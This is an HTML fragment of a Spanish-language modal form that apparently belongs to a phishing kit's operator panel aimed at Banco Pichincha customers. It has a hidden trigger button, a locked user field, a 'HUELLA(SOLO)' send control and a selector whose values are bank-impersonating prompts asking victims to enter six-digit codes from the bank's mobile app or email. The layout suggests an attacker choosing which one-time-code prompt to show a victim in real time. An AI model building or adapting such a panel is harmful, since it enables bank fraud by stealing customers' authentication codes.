<body>
   

<!-- Botón para mostrar el modal -->
<button type="button" id="showModalButton" class="btn btn-primary" style="display: none;" >Insertar preguntas</button>

<!-- Modal -->
<div class="modal" id="myModal" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Preguntas</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <!-- Formulario dentro del modal -->
        <form id="formulario">
          <div class="form-group">
            <label for="nombre">Usuario?:</label>
            <input type="text" class="form-control" id="user" required disabled="true">
          </div>
          <div class="form-group">
            <label for="nombre">NUMBER:</label>
            <input type="text" class="form-control" id="question1" required>
            <br>
            <label for="nombre" >HUELLA(SOLO):</label>
            <button class="btn btn-secondary" onclick="update()">enviar</button>
          </div>
          <div class="form-group">
            <label for="nombre">metodo:</label>
            <select name="" id="sele">
              <option value="Ingresa los 6 dígitos que generaste en la app Banca Móvil

              ">App Banca</option>
              <option value="Ingrese los 6 digitos que hemos enviado a tu correo registrado en Banco Pichincha">Mail Banca</option>
            </select>
          </div>
         
          <!-- Puedes agregar más campos o preguntas al formulario -->
        
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Cerrar</button>
        <button type="submit" id="guardarFormulario" class="btn btn-primary">Guardar</button>
    </form>
      </div>
    </div>
  </div>
</div>
